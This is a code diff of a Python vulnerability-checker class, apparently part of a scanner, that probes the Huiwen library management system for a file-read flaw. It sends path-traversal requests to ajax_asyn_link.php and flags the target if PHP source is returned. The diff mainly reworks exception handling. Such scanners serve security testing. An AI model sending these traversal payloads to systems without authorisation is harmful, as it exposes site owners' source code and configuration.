@@ -16,18 +16,21 @@ class libsys_ajax_asyn_link_fileread_BaseVerify:
         self.url = url
 
     def run(self):
-        for payload in [r"/zplug/ajax_asyn_link.php?url=../opac/search.php",
-                        r"/opac/zplug/ajax_asyn_link.php?url=../opac/search.php",
-                        r"/hwweb/zplug/ajax_asyn_link.php?url=../opac/search.php"]:
-            vulnurl = self.url + payload
-            try:
-                req = requests.get(vulnurl, timeout=10, verify=False)
+        try:
+            noexist = True
+            for payload in [r"/zplug/ajax_asyn_link.php?url=../opac/search.php",
+                            r"/opac/zplug/ajax_asyn_link.php?url=../opac/search.php",
+                            r"/hwweb/zplug/ajax_asyn_link.php?url=../opac/search.php"]:
+                vulnurl = self.url + payload
 
+                req = requests.get(vulnurl, timeout=10, verify=False)
                 if r"<?php" in req.text:
                     cprint("[+]存在汇文图书管理系统文件读取漏洞...(高危)\tpayload: "+vulnurl, "red")
-
-            except:
-                cprint("[-] "+__file__+"====>连接超时", "cyan")
+                    noexist = False
+            if noexist:
+                cprint("[-]不存在libsys_ajax_asyn_link_fileread漏洞", "white", "on_grey")
+        except:
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
